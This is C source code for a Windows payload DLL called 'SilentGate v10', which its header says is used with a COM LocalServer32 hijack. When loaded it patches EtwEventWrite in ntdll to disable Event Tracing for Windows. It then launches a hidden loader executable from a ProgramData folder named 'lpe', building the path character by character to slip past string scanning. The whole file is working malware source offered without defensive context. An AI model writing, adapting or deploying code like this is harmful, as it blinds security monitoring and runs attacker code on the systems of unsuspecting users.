/*
 * SilentGate v10 - Win11 Payload DLL
 * Author: JarDani
 * Exported callback that launches sg_loader.exe
 * Used with COM LocalServer32 hijack technique
 */
#include <windows.h>

__declspec(dllexport) int __stdcall PayloadCallback(
    void* a, void* b, void* c, void* d, void* e, int f, void* g) {

    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                   '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                   '.','e','x','e',0};
    CreateProcessA(loader,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return 0;
}

static DWORD WINAPI payload(LPVOID p) {
    Sleep(1500);

    /* ETW patch */
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    FARPROC etw=GetProcAddress(ntdll,"EtwEventWrite");
    DWORD old=0;
    VirtualProtect(etw,1,PAGE_EXECUTE_READWRITE,&old);
    *(BYTE*)etw=0xC3;
    VirtualProtect(etw,1,old,&old);

    /* Launch sg_loader */
    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                   '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                   '.','e','x','e',0};
    CreateProcessA(loader,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
    if(r==DLL_PROCESS_ATTACH){
        DisableThreadLibraryCalls(h);
        HANDLE t=CreateThread(NULL,0,payload,NULL,0,NULL);
        if(t) CloseHandle(t);
    }
    return TRUE;
}
